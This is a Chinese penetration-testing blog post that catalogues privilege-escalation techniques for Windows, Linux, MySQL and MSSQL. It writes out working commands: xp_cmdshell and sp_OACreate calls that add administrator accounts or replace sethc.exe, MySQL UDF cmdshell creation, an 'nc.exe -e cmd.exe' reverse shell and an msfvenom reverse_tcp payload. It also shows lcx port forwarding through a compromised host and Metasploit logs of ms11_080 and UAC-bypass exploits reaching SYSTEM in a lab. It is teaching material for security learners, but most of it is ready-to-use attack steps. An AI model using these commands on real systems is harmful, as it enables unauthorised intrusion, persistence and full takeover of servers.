    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/ti-quan-fang-shi-zong-jie/" itemprop="url">提权方式总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T13:30:39+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="linux和window中常见的提权方式"><a href="#linux和window中常见的提权方式" class="headerlink" title="linux和window中常见的提权方式"></a>linux和window中常见的提权方式</h2><h4 id="1-什么是提权"><a href="#1-什么是提权" class="headerlink" title="1.什么是提权"></a>1.什么是提权</h4><p>​        提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的（一般只是一个apache权限）。这时候为了“扩大战果”，就需要利用提权，来让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力），提升一下权限，有助于我们继续往下渗透。</p>
<ul>
<li>Windows：User &gt;&gt; System</li>
<li>Linux：User &gt;&gt; Root</li>
</ul>
<h4 id="2-提权的方式"><a href="#2-提权的方式" class="headerlink" title="2.提权的方式"></a>2.提权的方式</h4><p>1.、系统漏洞提权（Linux、Windows）</p>
<p>2、数据库提权</p>
<p>3、系统配置错误提权</p>
<p>4、权限继承类提权</p>
<p>5、第三方软件/服务提权</p>
<p>6、WebServer漏洞提权</p>
<h4 id="1-系统漏洞提权"><a href="#1-系统漏洞提权" class="headerlink" title="1.系统漏洞提权"></a>1.系统漏洞提权</h4><p>系统漏洞提权一般就是利用系统自身缺陷，用来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。</p>
<p>Windows的提权exp一般格式为MS08067.exe；<br>Linux的提权exp一般格式为2.6.18-194或2.6.18.c。</p>
<h4 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h4><ul>
<li>漏洞编号命名格式</li>
</ul>
<p>Windows系统漏洞编号命名格式为：MS08067</p>
<p>其中：MS是Micosoft的缩写，固定格式；08 表示年份，即2008年发布的漏洞；067 表示顺序，即当年度发布的第67个漏洞。</p>
<ul>
<li>使用exp提权</li>
</ul>
<p>在日常渗透测试过程中，我们常常会先是拿到webshell再进行提权。所以提权脚本也常常会被在webshell中运行使用。</p>
<p>那么我们如何知道使用哪个exp来提权呢？</p>
<p>我们可以使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p>
<p><strong>TIPS：</strong></p>
<p>1.渗透过程中经常会遇到管理员禁止了cmd.exe的使用，我们该怎么办？进止了exe文件的上传怎么办？<br> 2.管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br> 3.在使用webshell提权的时候要特别注意：<br> asp的webshell要支持：<br> wscript(wscript.shell/shell.application)<br> aspx能调用.net组件来执行cmd的命令<br> /c whoami</p>
<h5 id="linux系统提权"><a href="#linux系统提权" class="headerlink" title="linux系统提权"></a>linux系统提权</h5><p>Linux系统漏洞的exp一般按照内核版本来命名：2.6.18-194或2.6.18.c</p>
<p>形如2.6.18-194，可以直接执行；形如2.6.18.c，需要编译后运行，提权。当然也有少部分exp是按照发行版版本命名。</p>
<p>使用exp</p>
<p>一般情况下linux的本地提权要用nc反弹出来，因为Linux下提升权限后得到的是交互式shell，需反弹才能进行下一步命令的执行。<br>我们可以使用uname -a命令或者cat /proc/version，来判断系统的内核情况等等，然后使用相对应的exp进行提权。<br>注：</p>
<p>提权过程中需要为你的提权exp赋权，chmod。<br>linux服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般/tmp/目录不会被设置权限，这和windows下的tmp和回收站是一个道理，所以我们可以将exp存放到/tmp目录下。</p>
<h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><p>数据库提权是指：通过执行数据库语句、数据库函数等方式提升服务器用户的权限。</p>
<p>首先我们要先有能力登入数据库，所以通常我们拿到webshell之后要去网站目录去找数据库连接文件，常在形如xxx.conf或conf.xxx文件中。</p>
<h5 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h5><p>MySQL数据库一般是使用udf（用户自定义函数）提权或mof（托管对象格式）提权。</p>
<ul>
<li>udf提权（用户自定义函数）</li>
</ul>
<p><strong>条件：</strong><br>1、系统版本（Windows2000，XP,Win2003)；<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限；<br>3、具有root账号密码。</p>
<p><strong>使用方法：</strong><br>1、获取当前mysql的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。</p>
<p><strong>注：</strong></p>
<ul>
<li>Mysql&lt;5.0，导出路径随意;</li>
<li>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；</li>
<li>mysql&gt;5.1，需要导出dll到插件路径，例如：D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin<br>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。</li>
<li>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：drop function cmdshell;</li>
</ul>
<p><strong>使用SQL语句创建自定义函数。语法如下：</strong></p>
<p><code>Create Function 函数名 returns string soname &#39;导出的DLL路径&#39;;
eg: Create Function cmdshell returns string soname &#39;udf.dll&#39;;</code></p>
<p><strong>功能函数说明：</strong></p>
<ul>
<li>cmdshell 执行cmd;</li>
<li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li>
<li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li>
<li>backshell 反弹Shell;</li>
<li>ProcessView 枚举系统进程;</li>
<li>KillProcess 终止指定进程;</li>
<li>regread 读注册表;</li>
<li>regwrite 写注册表;</li>
<li>shut 关机,注销,重启;</li>
<li>about 说明与帮助函数;</li>
</ul>
<p><strong>创建函数成功后，就可以通过sql语句调用它了。</strong></p>
<p>语法如下：<br>select 创建的函数名 (‘参数列表’);<br>eg: select cmdshell(“net user nsfocus Nsf0cus /add”)；创建一个用户nsfocus，密码为Nsf0cus</p>
<p><strong>函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。</strong></p>
<p>删除函数的语法如下：<br>drop function 创建的函数名;<br>eg: drop function cmdshell;</p>
<h5 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h5><ul>
<li>导出C:\windows\udf.dll</li>
<li>Create Function cmdshell returns string soname ‘udf.dll’;</li>
<li>select cmdshell(‘whoami’)</li>
<li>drop function cmdshell</li>
</ul>
<h5 id="Mof提权（托管对象格式）"><a href="#Mof提权（托管对象格式）" class="headerlink" title="Mof提权（托管对象格式）"></a>Mof提权（托管对象格式）</h5><p>提权c:/windows/system32/wbem/mof/</p>
<pre><code>- use exploit/windows/mysql/mysql_mof
- set password xxx
- set username xxx
- set rhost xxx
- set rport xxx
- set payload windows/shell_reverse_tcp
- set lhost xxx
- set lport xxx
- exploit</code></pre><h5 id="Mssql数据库提权"><a href="#Mssql数据库提权" class="headerlink" title="Mssql数据库提权"></a>Mssql数据库提权</h5><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
<p><strong>在SA权限下</strong></p>
<p>1.存在xp_cmdshell时<br>使用xp_cmdshell执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell</p>
<p>2.xp_cmdshell无法使用时<br>    使用sp_OACreate执行命令，同样当出现错误可以恢复和开启</p>
<ol start="3">
<li><p>当执行命令无法使用时可以用沙盒提权 (使用xp_regwrite和openrowset)</p>
</li>
<li><p>当只有xp_regwrite可用时可以劫持粘滞键（sethc.exe)<br>使用xp_regwrite修改注册表</p>
</li>
</ol>
<p><strong>DBA权限下</strong></p>
<ol>
<li>备份到网站目录</li>
<li>通过备份文件到启动项提权</li>
</ol>
<h5 id="SA口令获取方法"><a href="#SA口令获取方法" class="headerlink" title="SA口令获取方法"></a>SA口令获取方法</h5><ul>
<li><strong>Webshell或源码获取</strong></li>
</ul>
<p>一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</p>
<pre><code>conn.aspx
config.aspx
config.php
web.config
.........

一般格式如：

server=localhost;
UID=sa;
PWD=shadowflow</code></pre><ul>
<li><strong>源代码泄露</strong></li>
</ul>
<p>网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、.git、.bak），以及运维人员打包源代码到网站服务器(<a href="http://www.rar/" target="_blank" rel="noopener">www.rar</a>等）。</p>
<ul>
<li><strong>嗅探</strong></li>
</ul>
<p>在局域网中使用cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码</p>
<ul>
<li><strong>口令暴力破解</strong></li>
</ul>
<p>利用mssql暴力破解工具对mssql进行暴力破解，一旦成功将获得sa相应权限</p>
<p><strong>常用SQL Server提权语句</strong></p>
<pre><code>查看数据库版本：select @@version

查看数据库系统参数：exec master..xp_msver;

查看用户所属角色信息：sp_helpsrvrolemember

查看当前数据库：select db_name()

显示机器上的驱动器：xp_availablemedia

查看当前账户权限

select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限

类似serveradmin,setupadmin,securityadmin,diskadmin,bulkadmin

select IS_MEMBER(&#39;db_owner&#39;) #判断是否为dbo权限

添加用户

exec master.dbo.sp_addlogin test,password #添加用户

exec master.dbo.sp_addsrvrolemember test,sysadmin #加权限

启动停止服务

exec master..xp_servicecontrol &#39;stop&#39;,&#39;test&#39;

exec master..xp_servicecontrol &#39;start&#39;,&#39;test&#39;

检查功能

SELECT count(*）FROM master.dbo.sysobjects WHERE name=&#39;xp_cmdshell&#39;

xp_cmdshell, xpregread,sp_makewebtask,xp_subdirs,xp_dirtree, sp_addextendedproc
</code></pre><p><strong>xp_cmdshell</strong></p>
<pre><code>1、开启xp_cmdshell存储过程

exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
exec sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;

2、关闭xp_cmdshell存储过程

exec sp_configure &#39;show advanced options&#39;, 1, RECONFIGURE;
exec sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;

3、xp_cmdshell执行命令

exec master..xp_cmdshell &#39;ver&#39;
exec master.dbo.xp_cmdshell &#39;net localgroup administrators test /add&#39;

4、恢复xp_cmdshell

exec sp_dropextendedproc &#39;xp_cmdshell&#39;

dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll) OR dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;d:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&quot;);EXEC sp_configure &#39;show advanced options&#39;, 0 --
</code></pre><p><strong>sp_OACreate</strong></p>
<pre><code>1、开启sp_OACreate
exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;

2、关闭sp_OACreate
exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;

3、禁用advanced options
EXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;

4、sp_OACreate执行命令

DECLARE @js int
EXEC sp_OACreate &#39;ScriptControl&#39;,@js OUT
EXEC sp_OASetProperty @js,&#39;Language&#39;,&#39;JavaScript&#39;
ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#39;

5、sp_OACreate移动文件
declare @aa int
exec sp_oacreate &#39;scripting.filesystemobject&#39; @aa out
exec sp_oamethod @aa, &#39;moveFile&#39;,null,&#39;c:\temp\ipmi.log&#39;,&#39;c:\temp\ipmi1.log&#39;;

6、sp_OACreate复制文件

declare @o int

exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out

exec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\windows\explorer.exe&#39;,&#39;c:\windows\system32\sethc.exe&#39;;

7、sp_OACreate删除文件

DECLARE @Result int

DECLARE @FSO_Token int

EXEC @Result = sp_OACreate &#39;Scripting.FileSystemObject&#39;, @FSO_Token OUTPUT

EXEC @Result = sp_OAMethod @FSO_Token, &#39;DeleteFile&#39;,NULL,&#39;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#39;

EXEC @Result = sp_OADestrop @FSO_Token

8、wscript.shell执行命令

9、Shell.Application执行命令

10、sp_oacreate 替换粘贴键
</code></pre><p><strong>沙盒执行命令</strong></p>
<p>openrowset开启</p>
<p>openrowset关闭</p>
<p>沙盒执行命令</p>
<p><strong>注册表篡改</strong></p>
<p>注册表劫持粘贴键</p>
<h4 id="系统配置不当提权"><a href="#系统配置不当提权" class="headerlink" title="系统配置不当提权"></a>系统配置不当提权</h4><p>利用配置不当提权</p>
<ul>
<li>前提：已经成功渗透进目标系统；</li>
<li>相比利用漏洞提权，是更常用的方法；</li>
<li>在大部分企业中，会将系统的漏洞即时进行补丁更新，难以通过系统自身我的漏洞进行入侵；</li>
<li>可以查找系统中以system权限启动的服务或应用，可以尝试将其替换或者反弹shell的方式提权；</li>
<li>可以查找NTFS权限允许users修改删除的应用，利用配置不当进行提权；</li>
<li>代码中是否有过滤参数的操作等都可以加以利用，进行提取</li>
</ul>
<h4 id="权限继承类提权"><a href="#权限继承类提权" class="headerlink" title="权限继承类提权"></a>权限继承类提权</h4><p><strong>开机启动项提权？</strong><br>windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。</p>
<h4 id="第三方软件-服务提权"><a href="#第三方软件-服务提权" class="headerlink" title="第三方软件/服务提权"></a>第三方软件/服务提权</h4><h4 id="WebServer漏洞提权"><a href="#WebServer漏洞提权" class="headerlink" title="WebServer漏洞提权"></a>WebServer漏洞提权</h4><h4 id="提权中常见的问题"><a href="#提权中常见的问题" class="headerlink" title="提权中常见的问题"></a>提权中常见的问题</h4><p>cmd无法执行</p>
<ul>
<li><p>cmd被删除</p>
<ul>
<li>绕过思路：找可读可写目录，上传cmd.exe</li>
</ul>
</li>
<li><p>cmd被降权</p>
<ul>
<li>绕过思路：找可读可写目录，上传cmd.exe</li>
</ul>
</li>
<li><p>组件被删除</p>
<ul>
<li>切换组件</li>
</ul>
</li>
<li><p>防护软件拦截</p>
<ul>
<li>很难绕过</li>
</ul>
</li>
<li><p>3389无法连接</p>
</li>
<li><p>端口被修改</p>
<ul>
<li>找端口（1-65535），使用端口扫描工具、注册表读取、查询PID</li>
</ul>
</li>
<li><p>端口被关闭</p>
<ul>
<li>上传3389打开工具到可读可写目录，需要先提权，调用执行exe工具</li>
</ul>
</li>
<li><p>内网环境</p>
<ul>
<li>端口转发：<ol>
<li>外网服务器：lcx.exe -listen 1234 4321 (监听1234端口的流量并将其转发至本地4321端口)</li>
<li>内网肉鸡：lcx.exe -slave 121.43.99.73 1234 192.168.1.106 1111 (将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上)</li>
<li>外网 连接本地端口4321 即代表连接肉鸡的1111端口</li>
</ol>
</li>
</ul>
</li>
<li><p>防护软件拦截</p>
<ul>
<li>很困难</li>
</ul>
</li>
</ul>
<h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><h5 id="1-Linux提权辅助工具"><a href="#1-Linux提权辅助工具" class="headerlink" title="1.Linux提权辅助工具"></a>1.Linux提权辅助工具</h5><p>Linux_Exploit_Suggester是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</code></pre><p> 用法示例：</p>
<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 2.6.28</code></pre><h5 id="2-Windows提权辅助工具"><a href="#2-Windows提权辅助工具" class="headerlink" title="2.Windows提权辅助工具"></a>2.Windows提权辅助工具</h5><p>Windows-Exploit-Suggester是受Linux_Exploit_Suggester的启发而开发的一款提权辅助工具，用python开发而成，通过比对systeminfo生成的文件，从而发现系统是否存在未修复漏洞。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</code></pre><p>用法示例：</p>
<pre><code>#查看系统可能存在的漏洞
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext &#39;windows server 2008 r2&#39;</code></pre><h5 id="3-gfto"><a href="#3-gfto" class="headerlink" title="3.gfto"></a>3.gfto</h5><p>gtfo是一个纯粹用python3编写的工具，用于搜索GTFOBins和LOLBAS上的二进制文件。</p>
<p>github项目地址： </p>
<pre><code>https://github.com/mzfr/gtfo</code></pre><p>很明显，从以上描述里，我们知道这款工具并不是主角，需要重点关注的是GTFOBins和LOLBAS。</p>
<p>GTFOBins：Linux命令提权辅助查询.</p>
<h5 id="4-Beroot"><a href="#4-Beroot" class="headerlink" title="4.Beroot"></a>4.Beroot</h5><p>BeRoot Project是一个利用后的工具，可以检查常见的错误配置，以找到提升我们特权的方法，该项目可在Windows，Linux和Mac OS上运行。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/AlessandroZ/BeRoot</code></pre><h5 id="5-Vulmap"><a href="#5-Vulmap" class="headerlink" title="5.Vulmap"></a>5.Vulmap</h5><p>Vulmap是一个开源的在线本地漏洞扫描程序项目。它由适用于Windows和Linux操作系统的联机本地漏洞扫描程序组成。</p>
<p>Github项目地址：</p>
<pre><code>https://github.com/vulmon/Vulmap</code></pre><h5 id="6-WindowsVulnScan"><a href="#6-WindowsVulnScan" class="headerlink" title="6.WindowsVulnScan"></a>6.WindowsVulnScan</h5><p>这是一款基于主机的漏洞扫描工具，查看查找主机上具有的CVE和具有公开EXP的CVE。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/chroblert/WindowsVulnScan</code></pre><h5 id="7、ATRoot-Auxiliary-v2-0"><a href="#7、ATRoot-Auxiliary-v2-0" class="headerlink" title="7、ATRoot Auxiliary v2.0"></a>7、ATRoot Auxiliary v2.0</h5><p>基于java开发的提权辅助工具，支持双端加载，本地模式配置文件存放于本地软件目录下的conf目录；远程模式则可以更新配置文件</p>
<h5 id="8、在线提权漏洞检测平台"><a href="#8、在线提权漏洞检测平台" class="headerlink" title="8、在线提权漏洞检测平台"></a>8、在线提权漏洞检测平台</h5><p>一款为主流 Linux/Unix 和 Windows 系统提供精准且高效的操作系统脆弱性漏洞检测的专业化平台，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。</p>
<p>在线查询地址：</p>
<pre><code>https://detect.secwx.com/</code></pre><h5 id="9-提权辅助网页"><a href="#9-提权辅助网页" class="headerlink" title="9.提权辅助网页"></a>9.提权辅助网页</h5><p>在Windows提权的时候，对比补丁找Exp很烦吧？老是忘记一些提权命令跟工具的语法很苦逼吧？没事，有了这款工具什么问题都解决~</p>
<p>在线查询地址：</p>
<pre><code>http://bugs.hacking8.com/tiquan/</code></pre><h3 id="window提权的常见方式："><a href="#window提权的常见方式：" class="headerlink" title="window提权的常见方式："></a>window提权的常见方式：</h3><h5 id="window下的用户权限："><a href="#window下的用户权限：" class="headerlink" title="window下的用户权限："></a>window下的用户权限：</h5><ul>
<li>user</li>
<li>administrator</li>
<li>system</li>
</ul>
<h5 id="一些常见命令"><a href="#一些常见命令" class="headerlink" title="一些常见命令"></a>一些常见命令</h5><pre><code>systeminfo | findstr OS #获取系统版本信息
hostname    #获取主机名称
whomai /priv    #显示当前用户的安全特权
quser or query user    #获取在线用户
netstat -ano | findstr 3389    #获取rdp连接来源IP
dir c:\programdata\ #分析安装杀软
wmic qfe get Caption,Description,HotFixID,InstalledOn    #列出已安装的补丁
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber    #获取远程端口
tasklist /svc | find &quot;TermService&quot; + netstat -ano    #获取远程端口</code></pre><h5 id="window-2003-xp"><a href="#window-2003-xp" class="headerlink" title="window 2003 xp"></a>window 2003 xp</h5><p>现在03的机器已经很少了，所以现在只是简单的说一些常见的思路，操作，第三方之类的除外</p>
<p>实验环境：</p>
<p>windows 2003：192.168.0.105</p>
<p>kali ： 192.168.0.107</p>
<p>首先生成个木马：</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe -o payload.exe</code></pre><p>如果有waf，生成的木马文件会被删除，可以使用veil生成免杀马，当然如果只是为了反弹shell，也可以上传一个nc.exe，在目标服务器上执行nc正向连接：</p>
<pre><code>nc.exe -e cmd.exe 192.168.0.107 4444</code></pre><p>nc shell反弹成功后：</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154018196-1241701420.png" alt="img"></p>
<p>msf shell反弹成功后，查看当前权限</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522153318096-1634466475.jpg" alt="img"></p>
<p>windows2003 可以直接 getsystem提权</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154110280-1290361076.jpg" alt="img"></p>
<p>提权失败，一般可能是uac的问题，尝试bypass uac</p>
<ul>
<li>use exploit/windows/local/ask</li>
</ul>
<pre><code>msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask
msf5 exploit(windows/local/ask) &gt; show options 

Module options (exploit/windows/local/ask):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME                    no        File name on disk
   PATH                        no        Location on disk, %TEMP% used if not set
   SESSION                     yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/local/ask) &gt; set SESSION 2
SESSION =&gt; 2
msf5 exploit(windows/local/ask) &gt; set TECHNIQUE up.exe
[-] The following options failed to validate: Value &#39;up.exe&#39; is not valid for option &#39;TECHNIQUE&#39;.
TECHNIQUE =&gt; EXE
msf5 exploit(windows/local/ask) &gt; set TECHNIQUE EXE
TECHNIQUE =&gt; EXE
msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ask) &gt; set lhost 192.168.0.107
lhost =&gt; 192.168.0.107
msf5 exploit(windows/local/ask) &gt; show options 

Module options (exploit/windows/local/ask):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME                    no        File name on disk
   PATH                        no        Location on disk, %TEMP% used if not set
   SESSION    2                yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     192.168.0.107    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/local/ask) &gt; sessions -i

Active sessions
===============

  Id  Name  Type                     Information                                 Connection
  --  ----  ----                     -----------                                 ----------
  1         meterpreter x86/windows  SERVER-816F6090\xiaoming @ SERVER-816F6090  192.168.0.107:4444 -&gt; 192.168.0.105:1032 (192.168.0.105)
  2         meterpreter x86/windows  SERVER-816F6090\xiaoming @ SERVER-816F6090  192.168.0.107:4444 -&gt; 192.168.0.105:1033 (192.168.0.105)

msf5 exploit(windows/local/ask) &gt; exploit 

[*] Started reverse TCP handler on 192.168.0.107:4444 
[+] UAC is not enabled, no prompt for the user
[*] Uploading VerOkoVbPk.exe - 73802 bytes to the filesystem...
[*] Executing Command!
</code></pre><p>或者：</p>
<ul>
<li>use exploit/windows/local/bypassuac</li>
<li>use exploit/windows/local/bypassuac_injection</li>
</ul>
<p>使用漏洞提权</p>
<pre><code>meterpreter &gt; run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</code></pre><p>以ms11-080为例</p>
<pre><code>msf5 &gt; use exploit/windows/local/ms11_080_afdjoinleaf 
msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; show options 

Module options (exploit/windows/local/ms11_080_afdjoinleaf):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; set SESSION 2
SESSION =&gt; 2
msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; run

[*] Started reverse TCP handler on 192.168.0.107:4444 
[*] Running against Windows Server 2003 SP2
[*] HaliQuerySystemInformation Address: 0x80a6ba1e
[*] HalpSetSystemInformation Address: 0x80a6dc60
[*] Triggering AFDJoinLeaf pointer overwrite...
[*] Injecting the payload into SYSTEM process: winlogon.exe
[*] Sending stage (179779 bytes) to 192.168.0.105
[*] Restoring the original token...
[*] Meterpreter session 3 opened (192.168.0.107:4444 -&gt; 192.168.0.105:1035) at 2019-05-13 21:26:33 +0800

meterpreter &gt; getuid 
Server username: NT AUTHORITY\SYSTEM</code></pre><p>提权成功：</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154443677-990970002.jpg" alt="img"></p>
<h4 id="at命令提权"><a href="#at命令提权" class="headerlink" title="at命令提权"></a>at命令提权</h4><p>在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将Administrators 组下的用户权限提升到 SYSTEM</p>
<p>at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、</p>
<p>可以是一个二进制文件。</p>
<pre><code>语法：at 时间 命令
例子：at 10:45PM calc.exe</code></pre><p>该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。</p>
<p>我们可以通过 “/interactive”开启界面交互模式：</p>
<pre><code>at 10:45PM /interactive calc.exe </code></pre><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154647644-1514865506.jpg" alt="img"></p>
<p>在得到一个system的cmd之后，使用taskmgr命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境。</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522154816521-2015900158.jpg" alt="img"></p>
<h4 id="at配合msf提权"><a href="#at配合msf提权" class="headerlink" title="at配合msf提权"></a>at配合msf提权</h4><p>可以采用 Regsvr32 一条命令上线</p>
<p>msf下配置</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155002108-1416348832.jpg" alt="img"></p>
<p>cmd下执行</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155024645-120375889.jpg" alt="img"></p>
<p>等待上线</p>
<p>可是这里一般会出现问题..</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155114408-603066182.jpg" alt="img"></p>
<p>后我们也可以选择上线木马的方式来获取shell</p>
<p>等待上线</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155209993-1691279994.jpg" alt="img"></p>
<p>上线后为system</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155237335-632224558.jpg" alt="img"></p>
